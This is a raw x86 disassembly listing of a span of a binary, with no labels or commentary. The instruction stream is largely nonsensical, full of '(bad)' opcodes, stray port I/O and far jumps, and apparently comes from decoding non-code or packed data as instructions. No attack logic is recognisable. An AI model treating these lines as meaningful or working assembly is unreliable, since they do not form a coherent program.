  4212e1:	sar    DWORD PTR [edx],1
  4212e3:	mov    BYTE PTR [ecx*1-0x26526ea2],cl
  4212ea:	xchg   esp,eax
  4212eb:	jns    0x4212c5
  4212ed:	ret    0xd8b4
  4212f0:	ds jecxz 0x42133c
  4212f3:	test   al,0xf8
  4212f5:	inc    esi
  4212f6:	mov    ds:0xae71b8d5,eax
  4212fb:	adc    esp,edi
  4212fd:	inc    ebp
  4212fe:	dec    esp
  4212ff:	test   eax,0xdd6aa40d
  421304:	sbb    eax,0xc0de9a54
  421309:	ins    DWORD PTR es:[edi],dx
	...
  421316:	add    BYTE PTR [edx],dl
  421318:	and    bh,BYTE PTR [esi+0x4f]
  42131b:	jle    0x42137c
  42131d:	xor    edi,DWORD PTR [edi-0x32]
  421320:	(bad)  
  421321:	retf   0x4485
  421324:	jg     0x42135e
  421326:	sysenter 
  421328:	pop    DWORD PTR [ecx]
  42132a:	add    BYTE PTR [ebx],ch
  42132c:	add    al,BYTE PTR [eax]
  42132e:	add    BYTE PTR [ebp-0x1b],cl
  421331:	adc    ebp,ebp
  421333:	sub    eax,0xf5e266df
  421338:	cld    
  421339:	xchg   edx,eax
  42133a:	mov    dl,0x5b
  42133c:	fnsave [esi+eax*8-0x47]
  421340:	cmp    edx,eax
  421342:	fnstsw WORD PTR [esi+0xa0575a3]
  421348:	add    al,BYTE PTR [edi]
  42134a:	in     eax,dx
  42134b:	sub    dl,ch
  42134d:	xchg   dh,cl
  42134f:	fldenv [eax+ecx*2+0x32510d72]
  421356:	cmc    
  421357:	mov    eax,0x8f115edd
  42135c:	ds mov ds:0xf7052eb2,al
  421363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421364:	lahf   
  421365:	adc    DWORD PTR [ebp+eiz*2-0x48],esp
  421369:	cmc    
  42136a:	std    
  42136b:	mov    dl,al
  42136d:	(bad)  
  42136e:	imul   BYTE PTR fs:[edx]
  421371:	jne    0x421325
  421373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421375:	xchg   edx,eax
  421376:	leave  
  421377:	les    esp,FWORD PTR [ecx-0x40675051]
  42137d:	or     esi,DWORD PTR [edx+ebx*4-0x277c8ffb]
  421384:	int    0xcb
  421386:	cld    
  421387:	sbb    ah,BYTE PTR [ebp*1-0x10fa4daf]
  42138e:	rol    dl,1
  421390:	and    ebx,ecx
  421392:	inc    edi
  421393:	shl    BYTE PTR [edx-0xcda89fa],cl
  421399:	ins    BYTE PTR es:[edi],dx
  42139a:	test   BYTE PTR [ebp-0x65],dl
  42139d:	dec    ebx
  42139e:	push   ebp
  42139f:	rcr    DWORD PTR [ecx+0x73c4befd],cl
  4213a5:	mov    ah,0x10
  4213a7:	test   esi,0x20352d17
  4213ad:	adc    al,0x11
  4213af:	out    dx,eax
  4213b0:	out    0xde,al
  4213b2:	jmp    0x4213d3
  4213b4:	dec    ebx
  4213b5:	or     DWORD PTR [ecx+edx*8],ebp
  4213b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213b9:	or     DWORD PTR [ecx],esi
  4213bb:	in     al,0x7e
  4213bd:	mov    bl,0xa8
  4213bf:	(bad)  
  4213c0:	and    al,0x63
  4213c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213c3:	ins    DWORD PTR es:[edi],dx
  4213c4:	imul   esp,DWORD PTR ds:0x90601f2,0xffffffb0
  4213cb:	xor    dl,al
  4213cd:	retf   
  4213ce:	and    eax,DWORD PTR [ebp-0x2a]
  4213d1:	mov    bl,0x27
  4213d3:	mov    bh,0x41
  4213d5:	adc    eax,0x268bf1d9
  4213da:	repz popf 
  4213dc:	add    edx,DWORD PTR [ebx]
  4213de:	out    dx,al
  4213df:	lea    ebx,[edi-0x56]
  4213e2:	scas   al,BYTE PTR es:[edi]
  4213e3:	dec    edx
  4213e4:	mov    eax,DWORD PTR [edi-0x22]
  4213e7:	add    dl,bl
  4213e9:	in     al,0x6b
  4213eb:	or     bh,cl
  4213ed:	add    dl,bh
  4213ef:	add    BYTE PTR [ebx+0x8],bl
  4213f2:	aad    0xb6
  4213f4:	pop    edx
  4213f5:	outs   dx,BYTE PTR ds:[esi]
  4213f6:	cmp    DWORD PTR [eax-0x32],edx
  4213f9:	jmp    0x3d653a6a
  4213fe:	vmread DWORD PTR [ecx],ecx
  421401:	repz leave 
  421403:	call   0x30db:0x76e96714
  42140a:	aam    0x96
  42140c:	out    0x64,al
  42140e:	inc    edi
  42140f:	push   ecx
  421410:	adc    eax,0x568fedbf
  421415:	rol    DWORD PTR [edi],cl
  421417:	into   
  421418:	dec    edi
  421419:	es mov al,0x70
  42141c:	inc    ebx
  42141d:	mov    edi,0x96244f1c
  421422:	push   edi
  421423:	stc    
  421424:	add    eax,0xde83ae61
  421429:	lock sub BYTE PTR [ecx+0xba2812],cl
  421430:	in     eax,0x5c
  421432:	inc    edx
  421433:	mov    ds:0x3bde6f29,eax
  421438:	repnz nop
  42143a:	mov    edx,0x8a368442
  42143f:	xchg   ebp,eax
  421440:	gs cmc 
  421442:	cmp    BYTE PTR [ebx+0x20],ch
  421445:	into   
  421446:	ins    DWORD PTR es:[edi],dx
  421447:	mov    ch,0xc5
  421449:	xchg   DWORD PTR [esi],eax
  42144b:	dec    ebx
  42144c:	fbstp  TBYTE PTR [ebp-0x1a694e51]
  421452:	and    al,bh
  421454:	rcl    DWORD PTR [edx-0x7],cl
  421457:	fld    QWORD PTR [ebp-0x37a4282c]
  42145d:	mov    dh,BYTE PTR [eax-0xe3c32f4]
  421463:	xor    ebp,DWORD PTR [edi+0x4c60b0a1]
  421469:	jbe    0x42144a
  42146b:	fld    DWORD PTR [ebx-0x38fd7085]
  421471:	rcl    ecx,0x7a
  421474:	jg     0x421437
  421476:	data16 mov al,0x1d
  421479:	cdq    
  42147a:	neg    DWORD PTR [edi-0x730b86ad]
  421480:	sub    al,0xe
  421482:	fcomi  st,st(6)
  421484:	rol    DWORD PTR [esi+0xef32f97],1
  42148a:	pusha  
  42148b:	jnp    0x421482
  42148d:	je     0x4214d4
  42148f:	pop    ecx
  421490:	sub    al,BYTE PTR [ebp+0x3]
  421493:	pop    ebp
  421494:	pop    edx
  421495:	push   ss
  421496:	push   ecx
  421497:	mov    eax,ds:0xf07e68f
  42149c:	mov    ebp,0x42b99bd9
  4214a1:	pop    ss
  4214a2:	fst    QWORD PTR [edi+ebp*8]
  4214a5:	jno    0x4214b7
  4214a7:	adc    eax,0xc554a5f9
  4214ac:	xchg   ebx,eax
  4214ad:	sub    al,0xa0
  4214af:	rcl    BYTE PTR [edi],cl
  4214b1:	jo     0x421448
  4214b3:	mov    esi,0xa18cb52a
  4214b8:	scas   al,BYTE PTR es:[edi]
  4214b9:	push   eax
  4214ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214bb:	or     bh,bl
  4214bd:	cld    
  4214be:	ins    DWORD PTR es:[edi],dx
  4214bf:	imul   esp,DWORD PTR [eax],0x8ba4ae2a
  4214c5:	cmp    al,0x6a
  4214c7:	jnp    0x4214ef
  4214c9:	iret   
  4214ca:	popf   
  4214cb:	icebp  
  4214cc:	inc    esp
  4214cd:	inc    eax
  4214ce:	and    esi,edi
  4214d0:	jmp    0x421543
  4214d2:	mov    ebx,0x982d0f69
  4214d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214d8:	aam    0xeb
  4214da:	cmp    cl,BYTE PTR [eax]
  4214dc:	mov    esp,DWORD PTR [edx-0x5f2e9b61]
  4214e2:	shl    al,0x1c
  4214e5:	psubw  mm5,QWORD PTR [ecx+0x26b02d70]
  4214ec:	or     bh,ah
  4214ee:	rcl    DWORD PTR [edi],cl
  4214f0:	imul   esi,DWORD PTR [ebp-0x5b],0x4b
  4214f4:	lock cs and eax,0x9dd0c16c
  4214fb:	daa    
  4214fc:	dec    ebp
  4214fd:	and    eax,0xe3becec0
  421502:	scas   al,BYTE PTR es:[edi]
  421503:	test   DWORD PTR [esi-0x36f3561a],ecx
  421509:	add    al,0xd
  42150b:	call   0xa79d:0x17875c8
  421512:	data16 rcr BYTE PTR ds:0xcb4b4fac,0x8f
  42151a:	dec    BYTE PTR [edi+eiz*4]
  42151d:	sahf   
  42151e:	(bad)  
  42151f:	jb     0x421564
  421521:	(bad)  
  421522:	jecxz  0x42150d
  421524:	mov    al,0x64
  421526:	xor    eax,0xf47a23c5
  42152b:	ins    DWORD PTR es:[edi],dx
  42152c:	adc    al,dh
  42152e:	addr16 inc edx
  421530:	cmp    DWORD PTR [edi],0xc2f25e3e
  421536:	fidiv  WORD PTR [ebx+eax*1+0x34]
  42153a:	push   ds
  42153b:	inc    ecx
  42153c:	inc    ebp
  42153d:	js     0x421518
  42153f:	cld    
  421540:	(bad)  
  421541:	div    BYTE PTR [ecx-0x10]
  421544:	pop    ebp
  421545:	mov    al,0x19
  421547:	mov    ds:0xd822df61,eax
  42154c:	loopne 0x421538
  42154e:	lods   al,BYTE PTR ds:[esi]
  42154f:	imul   ebp,DWORD PTR [ecx+0x7bf57fc8],0x5c0fe9d3
  421559:	jp     0x42155b
	...
  421567:	test   BYTE PTR [ecx],0xa0
  42156a:	pop    esi
  42156b:	(bad)  
  42156c:	(bad)  
  42156d:	(bad)  
  42156e:	test   eax,0xe19706c2
  421573:	mov    ?,esp
  421575:	test   edx,edx
  421577:	pop    edi
  421578:	xchg   ecx,eax
  421579:	add    DWORD PTR [eax],eax
  42157b:	sub    eax,DWORD PTR [edx]
  42157d:	add    BYTE PTR [eax],al
  42157f:	mov    dl,0xf7
  421581:	xchg   ebp,eax
  421582:	xor    ecx,DWORD PTR [ebx]
  421584:	out    0x3f,eax
  421586:	ins    DWORD PTR es:[edi],dx
  421587:	loop   0x4215f1
  421589:	jmp    0xd083:0xe9a247b7
  421590:	mov    cl,0x59
  421592:	push   edx
  421593:	rcr    DWORD PTR [ebp+0x1f42945d],cl
  421599:	sbb    DWORD PTR [ebx+0x6ab71b83],edi
  42159f:	nop
  4215a0:	sbb    cl,BYTE PTR [eax+0x32]
  4215a3:	dec    eax
  4215a4:	mov    eax,0x5b59c6a8
  4215a9:	ins    BYTE PTR es:[edi],dx
  4215aa:	(bad)  
  4215ab:	push   ds
  4215ac:	xor    BYTE PTR [ecx+ecx*8+0x5c29ad0d],dl
  4215b3:	in     eax,0x84
  4215b5:	ja     0x42159e
  4215b7:	outs   dx,DWORD PTR ds:[esi]
  4215b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215b9:	int    0xc
  4215bb:	ss adc al,0xc
  4215be:	mov    ebx,0x43dde9cf
  4215c3:	inc    ebp
  4215c4:	sub    DWORD PTR [edx-0x19396ae0],0xffffffc5
  4215cb:	clc    
  4215cc:	xchg   edi,eax
  4215cd:	mov    dl,0x2f
  4215cf:	lods   eax,DWORD PTR ds:[esi]
  4215d0:	push   ebp
  4215d1:	(bad)  
  4215d2:	sbb    eax,0xa883b990
  4215d7:	pushf  
  4215d8:	repnz rcl DWORD PTR [edx+0x8d426d8],0x8e
  4215e0:	and    BYTE PTR [esi+0x42331a56],al
  4215e6:	fdiv   QWORD PTR [ecx+0x23]
  4215e9:	mov    al,0x57
  4215eb:	rcr    DWORD PTR [ecx-0x33b07857],cl
  4215f1:	jb     0x421626
  4215f3:	pop    eax
  4215f4:	js     0x421659
  4215f6:	mov    esp,0x6bff4497
  4215fb:	jbe    0x421666
  4215fd:	fist   DWORD PTR [edi+0x74]
  421600:	mov    esi,edi
  421602:	pop    ecx
  421603:	jnp    0x421632
  421605:	aam    0xb
  421607:	push   ebx
  421608:	pop    edx
  421609:	mov    ebp,ds
  42160b:	dec    edx
  42160c:	sbb    eax,0x798e7755
  421611:	xchg   ebx,eax
  421612:	adc    eax,0x53e48989
  421617:	xlat   BYTE PTR ds:[ebx]
  421618:	jmp    0xa2f0:0x46d63feb
  42161f:	rcr    BYTE PTR [eax-0x6],0xb
  421623:	inc    esp
  421624:	sub    BYTE PTR [esi],dl
  421626:	add    DWORD PTR [eax],edi
  421628:	nop
  421629:	mov    al,0x22
  42162b:	loope  0x4215ff
  42162d:	lock shl BYTE PTR [ebp-0x3426fd7a],1
  421634:	push   ebx
  421635:	(bad)  
  421636:	mov    ebx,ebp
  421638:	and    ch,al
  42163a:	jns    0x4215d1
  42163c:	push   eax
  42163d:	xchg   esi,eax
  42163e:	fadd   st(1),st
  421640:	mov    DWORD PTR [edx-0x36],ebx
  421643:	mov    BYTE PTR [edi-0x6c],0x2b
  421647:	sub    eax,0x8f51d976
  42164c:	(bad)  
  42164d:	daa    
  42164e:	mov    edi,0x4666ff81
  421653:	xor    bh,al
  421655:	cs jne 0x421664
  421658:	dec    esp
  421659:	mov    al,0x6b
  42165b:	inc    esp
  42165c:	aas    
  42165d:	pusha  
  42165e:	sub    cl,0xba
  421661:	pop    ss
  421662:	(bad)  
  421664:	sbb    eax,DWORD PTR [ecx+ecx*8+0x23]
  421668:	xor    BYTE PTR [edi-0x5cf9ac61],ah
  42166e:	adc    al,0xab
  421670:	out    0xc8,al
  421672:	iret   
  421673:	das    
  421674:	pushf  
  421675:	lock jg 0x42160b
  421678:	push   eax
  421679:	mov    ds:0xae9747c0,al
  42167e:	adc    DWORD PTR [esi-0x5d],edx
  421681:	ins    DWORD PTR es:[edi],dx
  421682:	retf   0xb31c
  421685:	shl    BYTE PTR [ebp-0x3c486d4a],1
  42168b:	aad    0x80
  42168d:	out    dx,eax
  42168e:	adc    dh,BYTE PTR [esi]
  421690:	or     ch,BYTE PTR [edi-0x1]
  421693:	fisub  DWORD PTR [eax+0x1e43e78f]
  421699:	mov    bh,0xb3
  42169b:	in     eax,0x7e
  42169d:	pop    edi
  42169e:	iret   
  42169f:	daa    
  4216a0:	sub    al,0x26
  4216a2:	xor    eax,0x15b2ead6
  4216a7:	(bad)  
  4216a8:	std    
  4216a9:	mov    eax,0xcde58837
  4216ae:	scas   eax,DWORD PTR es:[edi]
  4216af:	cwde   
  4216b0:	imul   ebp,DWORD PTR [edi-0x1fd412cf],0xffffffa2
  4216b7:	add    bl,BYTE PTR [edi+0x16]
  4216ba:	mov    dl,ch
  4216bc:	xor    al,bl
  4216be:	cmp    ebx,DWORD PTR [esi+0x734b1ebe]
  4216c4:	int3   
  4216c5:	mov    edx,0xbf84041
  4216ca:	call   0xeb23f820
  4216cf:	push   ebp
  4216d0:	sub    DWORD PTR [ecx],0x2f9e8ae8
  4216d6:	jg     0x4216ea
  4216d8:	test   al,0xf8
  4216da:	retf   0xa859
  4216dd:	pop    es
  4216de:	push   es
  4216df:	(bad)  
  4216e0:	xchg   esp,eax
  4216e1:	(bad)  
  4216e2:	call   0xca23:0xda931dd9
  4216e9:	stc    
  4216ea:	cli    
  4216eb:	imul   edi,DWORD PTR [ebp-0x1d],0x62e4499a
  4216f2:	xchg   esp,eax
  4216f3:	je     0x42174a
  4216f5:	inc    ebp
  4216f6:	adc    BYTE PTR [esi-0x301f39ce],cl
  4216fc:	xchg   edi,eax
  4216fd:	test   BYTE PTR [eax-0x1f89d612],dh
  421703:	and    al,ah
  421705:	or     al,0xae
  421707:	cmp    bl,BYTE PTR [eax-0x987ef20]
  42170d:	popa   
  42170e:	sbb    eax,0x441734bd
  421713:	add    BYTE PTR [edx],ch
  421715:	dec    ecx
  421716:	test   eax,0x7a6cf5fe
  42171b:	hlt    
  42171c:	lock shr BYTE PTR [edi+eiz*2+0x51a5bcc8],cl
  421724:	leave  
  421725:	retf   
  421726:	ins    BYTE PTR es:[edi],dx
  421727:	xchg   DWORD PTR [ecx+edx*4+0x1bb0ff95],eax
  42172e:	and    eax,0x31bc8230
  421733:	ficom  DWORD PTR ds:0xca29ba10
  421739:	inc    ecx
  42173a:	cmp    ecx,ecx
  42173c:	inc    esi
  42173d:	sbb    eax,0xb3c30819
  421742:	xor    ebx,DWORD PTR [edi+esi*1+0x7b]
  421746:	mov    ds:0x67f223c7,eax
  42174b:	cld    
  42174c:	and    edi,DWORD PTR ds:0xa1ec55ff
  421752:	das    
  421753:	test   BYTE PTR [edi-0x5987627b],al
  421759:	push   0xc2ee98dd
  42175e:	add    ah,ch
  421760:	ja     0x421773
  421762:	jp     0x4217b7
  421764:	call   0xf25e:0xa9d53c73
  42176b:	lods   eax,DWORD PTR ds:[esi]
  42176c:	les    ebx,FWORD PTR [ebp+0x5fdaa2ad]
  421772:	cmp    DWORD PTR [edx],esp
  421774:	mov    bl,0x75
  421776:	or     BYTE PTR [edx],0x15
  421779:	js     0x421700
  42177b:	shl    BYTE PTR [esi],0x98
  42177e:	test   al,0x5b
  421780:	add    eax,0x6a915ab5
  421785:	hlt    
  421786:	mov    ah,0xae
  421788:	dec    edx
  421789:	sub    DWORD PTR [edx],edx
  42178b:	in     eax,0xc3
  42178d:	outs   dx,DWORD PTR ds:[esi]
  42178e:	adc    BYTE PTR [edi],dh
  421790:	and    BYTE PTR [edi+0x11],0xc3
  421794:	jecxz  0x421777
  421796:	rcl    BYTE PTR [ecx+0x5],1
  421799:	test   eax,0x488ed79b
  42179e:	enter  0xe811,0x61
  4217a2:	imul   DWORD PTR [edx-0x16a446bc]
  4217a8:	fldenv [esi]
	...
  4217b6:	add    BYTE PTR [edx],bl
  4217b8:	adc    al,0x6d
  4217ba:	test   BYTE PTR [edi-0x3],ch
  4217bd:	sti    
  4217be:	sahf   
  4217bf:	mov    ah,0x92
  4217c1:	enter  0x5ba2,0xa6
  4217c5:	push   ss
  4217c6:	jg     0x421752
  4217c8:	xchg   ebx,eax
  4217c9:	add    DWORD PTR [eax],eax
  4217cb:	sub    eax,DWORD PTR [edx]
  4217cd:	add    BYTE PTR [eax],al
  4217cf:	xchg   BYTE PTR [ebx+0x31],bh
  4217d2:	(bad)  
  4217d4:	popa   
  4217d5:	out    0x31,eax
  4217d7:	pop    DWORD PTR [ebx-0x72]
  4217da:	pop    edx
  4217db:	out    dx,eax
  4217dc:	mov    edx,0x68e24ea4
  4217e1:	pop    ebp
  4217e2:	xor    dh,BYTE PTR [eax+0x8]
  4217e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217e6:	sub    DWORD PTR [eax-0x7],edi
  4217e9:	jae    0x4217fa
  4217eb:	mov    ah,0xd8
  4217ed:	sahf   
  4217ee:	cwde   
  4217ef:	(bad)  
  4217f1:	jmp    0x42182b
  4217f3:	adc    cl,0xb0
  4217f6:	inc    eax
  4217f7:	enter  0x4899,0xec
  4217fb:	push   ecx
  4217fc:	push   ebx
  4217fd:	add    ecx,esi
  4217ff:	fwait
  421800:	sub    bh,bh
  421802:	cmp    edx,DWORD PTR [ecx]
  421804:	scas   eax,DWORD PTR es:[edi]
  421805:	mov    ebx,0xaf72ef26
  42180a:	mov    al,ds:0x2ee57e52
  42180f:	adc    DWORD PTR [edx],edi
  421811:	shl    DWORD PTR [ebx],0xf
  421814:	dec    eax
  421815:	repz cdq 
  421817:	lds    esp,FWORD PTR [edx-0x23d04988]
  42181d:	dec    esi
  42181e:	push   ss
  42181f:	fisub  WORD PTR [edi]
  421821:	arpl   WORD PTR [ebx+0x14f8e2fa],cx
  421827:	xor    BYTE PTR [edi],0xa0
  42182a:	pop    ebx
  42182b:	(bad)  
  42182c:	sahf   
  42182d:	out    0x43,eax
  42182f:	jbe    0x4217bc
  421831:	imul   edx,DWORD PTR [edi-0xb38a348],0x6ae5150a
  42183b:	push   ss
  42183c:	pop    edi
  42183d:	arpl   bx,sp
  42183f:	push   ss
  421840:	mov    eax,ds:0x5fa95e77
  421845:	and    al,0x48
  421847:	jne    0x4217e0
  421849:	xchg   ecx,eax
  42184a:	and    al,0xfc
  42184c:	push   edx
  42184d:	pop    es
  42184e:	xor    DWORD PTR [edi],ebx
  421850:	in     al,0x7d
  421852:	arpl   WORD PTR [ecx+0x41665949],cx
  421858:	outs   dx,DWORD PTR ds:[esi]
  421859:	(bad)  
  42185a:	jmp    0x95cf:0xbb3ab59
  421861:	jb     0x421871
  421863:	stc    
  421864:	je     0x42188b
  421866:	push   edx
  421867:	dec    esp
  421868:	(bad)  
  421869:	retf   
  42186a:	das    
  42186b:	test   ebp,0x2e7eb837
  421871:	or     eax,0x362d7c64
  421876:	fidivr DWORD PTR ds:0xea925c9a
  42187c:	cmp    DWORD PTR [eax+ecx*8+0x49],eax
  421880:	aad    0x3d
  421882:	mov    dh,0xe5
  421884:	jbe    0x421890
  421886:	mov    ecx,0x3d91cd53
  42188b:	push   ss
  42188c:	idiv   DWORD PTR [edi+0xfaa0ec8]
  421892:	sbb    eax,edx
  421894:	lea    edi,[edi]
  421896:	inc    ebx
  421897:	pop    ebx
  421898:	bound  ecx,QWORD PTR [esi-0x7f9e5081]
  42189e:	int    0xd7
  4218a0:	ins    DWORD PTR es:[edi],dx
  4218a1:	add    al,0x43
  4218a3:	jb     0x421870
  4218a5:	and    eax,DWORD PTR [edi+esi*8+0x5e]
  4218a9:	sub    esp,DWORD PTR [edi+0xdb8ef5e]
  4218af:	lods   eax,DWORD PTR ds:[esi]
  4218b0:	(bad)  
  4218b1:	js     0x4218b7
  4218b3:	or     ebx,DWORD PTR [ebx]
  4218b5:	rol    BYTE PTR [esi+0x79c1336b],0x91
  4218bc:	cmp    DWORD PTR [ebx-0x4d906ec],edx
  4218c2:	inc    ebp
  4218c3:	sub    eax,0x3970002d
  4218c8:	cdq    
  4218c9:	xchg   esi,eax
  4218ca:	xor    ebp,esp
  4218cc:	out    0x4b,eax
  4218ce:	aam    0xdd
  4218d0:	in     eax,0x7d
  4218d2:	sub    bh,BYTE PTR [esi-0x5e1ae305]
  4218d8:	jmp    0x3df4:0x8f2c5ed7
  4218df:	shr    BYTE PTR [edx+0x2d5cc3f3],cl
  4218e5:	and    ebp,DWORD PTR [eax-0x6c3190ea]
  4218eb:	imul   eax,edi,0x14
  4218ee:	ins    DWORD PTR es:[edi],dx
  4218ef:	fld    TBYTE PTR [eax+0x2f]
  4218f2:	add    DWORD PTR [ebx-0x38],ebx
  4218f5:	xchg   ebx,eax
  4218f6:	fisttp DWORD PTR [ecx]
  4218f8:	adc    al,0x56
  4218fa:	enter  0xec24,0x1c
  4218fe:	(bad)  
  4218ff:	fsub   DWORD PTR [ecx-0x63]
  421902:	cmp    ebx,DWORD PTR [edx]
  421904:	popa   
  421905:	xor    al,BYTE PTR [ebx]
  421907:	push   ebp
  421908:	or     eax,0xd5c7706c
  42190d:	loope  0x421971
  42190f:	int3   
  421910:	(bad)  
  421912:	add    DWORD PTR [ebx],edi
  421914:	clc    
  421915:	(bad)  
  421916:	fistp  DWORD PTR [ebx+0x48]
  421919:	cmc    
  42191a:	loopne 0x42197f
  42191c:	(bad)
  42191f:	mov    eax,0x20fc26d0
  421924:	sub    al,0xff
  421926:	mov    ah,0xfb
  421928:	dec    ecx
  421929:	sub    eax,0x51371cec
  42192e:	inc    edx
  42192f:	jge    0x4218bd
  421931:	or     edi,DWORD PTR [edx-0x35]
  421934:	mov    esi,DWORD PTR [ebx-0x64]
  421937:	jecxz  0x4218d0
  421939:	xor    ebx,DWORD PTR [ebx+0x2d]
  42193c:	nop
  42193d:	add    DWORD PTR [edi+eiz*1-0x6d],ebp
  421941:	mov    BYTE PTR [edi+ebp*1-0x53337a0],bh
  421948:	ja     0x421952
  42194a:	inc    ecx
  42194b:	cs scas al,BYTE PTR es:[edi]
  42194d:	stos   DWORD PTR es:[edi],eax
  42194e:	pop    ecx
  42194f:	cs je  0x421919
  421952:	mov    dh,0xfd
  421954:	xor    al,0xa0
  421956:	(bad)  
  421957:	daa    
  421958:	push   eax
  421959:	dec    edx
  42195a:	xor    al,0xb
  42195c:	mov    dl,0x43
  42195e:	adc    BYTE PTR [esi-0x68],ch
  421961:	mov    dh,0xf4
  421963:	je     0x42191a
  421965:	xchg   BYTE PTR [ebp+eiz*8+0x7a],ah
  421969:	xor    eax,0x6457e343
  42196e:	test   DWORD PTR [esi],edi
  421970:	jle    0x421950
  421972:	jl     0x4219ac
  421974:	ds inc esi
  421976:	fs sbb eax,0xd8d2ffe2
  42197c:	xchg   ebx,eax
  42197d:	rol    BYTE PTR [ebx+0x50],cl
  421980:	push   ss
  421981:	ss sub eax,0xfead3416
  421987:	iret   
  421988:	cmp    DWORD PTR [eax-0x735baafe],eax
  42198e:	cdq    
  42198f:	leave  
  421990:	xchg   esi,eax
  421991:	das    
  421992:	mov    bh,0x9f
  421994:	scas   al,BYTE PTR es:[edi]
  421995:	or     al,0xf5
  421997:	shl    BYTE PTR [esi],1
  421999:	inc    eax
  42199a:	scas   al,BYTE PTR es:[edi]
  42199b:	pop    ds
  42199c:	cmc    
  42199d:	pop    esi
  42199e:	jge    0x421986
  4219a0:	fstp   TBYTE PTR [ecx+edi*2-0x41]
  4219a4:	icebp  
  4219a5:	(bad)  
  4219a6:	(bad)  
  4219a7:	lods   eax,DWORD PTR ds:[esi]
  4219a8:	jae    0x421944
  4219aa:	pop    ds
  4219ab:	xor    eax,0xeb05ab12
  4219b0:	pop    esp
  4219b1:	mov    dh,0x5f
  4219b3:	int    0xf2
  4219b5:	push   0x55
  4219b7:	lock push esi
  4219b9:	jmp    0x8e9b6d12
  4219be:	mov    esp,DWORD PTR [ecx]
  4219c0:	pop    ebp
  4219c1:	daa    
  4219c2:	and    BYTE PTR [eax+ebx*8+0x71],dl
  4219c6:	clc    
  4219c7:	sar    BYTE PTR [ebx+0x4e],0xc9
  4219cb:	call   0xd2e1:0xf106fa0e
  4219d2:	gs hlt 
  4219d4:	or     ch,al
  4219d6:	dec    ebp
  4219d7:	push   esi
  4219d8:	pop    es
  4219d9:	sti    
  4219da:	fsubr  DWORD PTR [edx+0xa]
  4219dd:	call   0x84f8452a
  4219e2:	jle    0x421976
  4219e4:	rol    BYTE PTR [edx-0x10618061],1
  4219ea:	cmc    
  4219eb:	mov    dl,0xcb
  4219ed:	add    BYTE PTR [ecx-0x2d],ch
  4219f0:	iret   
  4219f1:	clc    
  4219f2:	sub    BYTE PTR [ebx],bh
  4219f4:	leave  
  4219f5:	int    0x29
  4219f7:	imul   ecx,DWORD PTR [ebx+0x15],0x0
  421a01:	add    BYTE PTR [eax],al
  421a03:	add    BYTE PTR [eax],al
  421a05:	add    BYTE PTR [eax],al
  421a07:	shr    DWORD PTR [edi+0x5b],cl
  421a0a:	sub    eax,0xfff73dff
  421a0f:	ret    
  421a10:	js     0x421a7c
  421a12:	addr16 ds mov edx,0x95b519b1
  421a19:	add    DWORD PTR [eax],eax
  421a1b:	sub    eax,DWORD PTR [edx]
  421a1d:	add    BYTE PTR [eax],al
  421a1f:	aaa    
  421a20:	daa    
  421a21:	enter  0x574a,0x24
  421a25:	xor    eax,0xa39d1535
  421a2a:	jmp    0xaf3c:0xdcfbef9c
  421a31:	cmp    DWORD PTR ds:0xf39794a2,edx
  421a37:	adc    ebp,DWORD PTR [eax+0x1a]
  421a3a:	jge    0x421aab
  421a3c:	mov    esp,0x55fe94f2
  421a41:	push   ecx
  421a42:	test   eax,0xc51ca491
  421a47:	dec    eax
  421a48:	xchg   ebx,eax
  421a49:	out    0x5c,al
  421a4b:	adc    eax,0xb44237f9
  421a50:	sub    DWORD PTR [ebp-0x48],ecx
  421a53:	mov    cl,0x89
  421a55:	xchg   ecx,eax
  421a56:	sti    
  421a57:	xor    edx,DWORD PTR [ebx-0x3a1cacc1]
  421a5d:	xor    eax,0x735edbba
  421a62:	fstp   st(6)
  421a64:	sahf   
  421a65:	xchg   esp,eax
  421a66:	test   al,0xf1
  421a68:	out    dx,eax
  421a69:	rcl    esi,0x9c
  421a6c:	hlt    
  421a6d:	(bad)
  421a70:	out    0x77,eax
  421a72:	inc    edi
  421a73:	sub    al,0xf5
  421a75:	jecxz  0x421ab0
  421a77:	mov    eax,0x3819dea3
  421a7c:	stc    
  421a7d:	test   DWORD PTR [ebp+0x79],esi
  421a80:	test   eax,0xf3977ba5
  421a85:	or     al,0xc8
  421a87:	imul   eax,DWORD PTR [ebx],0xac0b9186
  421a8d:	lock fwait
  421a8f:	xchg   ecx,eax
  421a90:	ins    BYTE PTR es:[edi],dx
  421a91:	rcl    BYTE PTR [edx+0x7f],0x85
  421a95:	enter  0x79a5,0xf2
  421a99:	pop    ebx
  421a9a:	gs adc eax,0xf1db7daf
  421aa0:	repz in al,0x29
  421aa3:	xchg   ebx,eax
  421aa4:	push   esi
  421aa5:	dec    eax
  421aa6:	add    BYTE PTR [edx+eiz*1-0x5e5194a4],cl
  421aad:	add    eax,0x41e9fe31
  421ab2:	jge    0x421aba
  421ab4:	push   cs
  421ab5:	mov    ch,0x2b
  421ab7:	mov    ds:0x5d31858e,al
  421abc:	jmp    0x1d01:0xc4e34aad
  421ac3:	jl     0x421adc
  421ac5:	icebp  
  421ac6:	fwait
  421ac7:	imul   edx,DWORD PTR [esi-0x69843db6],0x42
  421ace:	push   esp
  421acf:	dec    ebp
  421ad0:	dec    ebx
  421ad1:	repz or eax,0x7762f848
  421ad7:	jecxz  0x421b3c
  421ad9:	jno    0x421acb
  421adb:	mov    al,ds:0xef14e93e
  421ae0:	div    DWORD PTR ds:0x767bd544
  421ae6:	or     ecx,esi
  421ae8:	(bad)  
  421ae9:	jo     0x421a7e
  421aeb:	sbb    ebp,DWORD PTR [ecx+ecx*2]
  421aee:	mov    ah,0x65
  421af0:	ret    
  421af1:	mov    eax,ds:0xd2a58ffa
  421af6:	mov    bl,0x32
  421af8:	cli    
  421af9:	les    eax,FWORD PTR [esi+0x17]
  421afc:	pop    ebx
  421afd:	mov    al,ds:0x899775a9
  421b02:	adc    DWORD PTR [eax],ebp
  421b04:	cld    
  421b05:	cli    
  421b06:	inc    esp
